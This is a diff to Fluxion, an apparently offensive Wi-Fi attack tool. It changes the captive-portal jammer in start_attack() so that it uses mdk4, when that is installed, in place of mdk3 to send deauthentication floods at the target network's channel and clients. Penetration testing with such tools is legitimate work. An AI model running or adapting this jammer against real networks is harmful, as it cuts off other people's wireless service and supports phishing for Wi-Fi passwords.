@@ -1500,11 +1500,22 @@ start_attack() {
     # Save parent's pid, to get to child later.
     CaptivePortalJammerServiceXtermPID=$!
   else
-    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
+
+	if ! [ -x "$(command -v mdk4)" ];then
+    	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
         "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
-    # Save parent's pid, to get to child later.
-    CaptivePortalJammerServiceXtermPID=$!
+    	# Save parent's pid, to get to child later.
+    	CaptivePortalJammerServiceXtermPID=$!
+	
+	else
+	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
+        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
+        "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
+        # Save parent's pid, to get to child later.
+    	CaptivePortalJammerServiceXtermPID=$!
+	fi
+
   fi
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
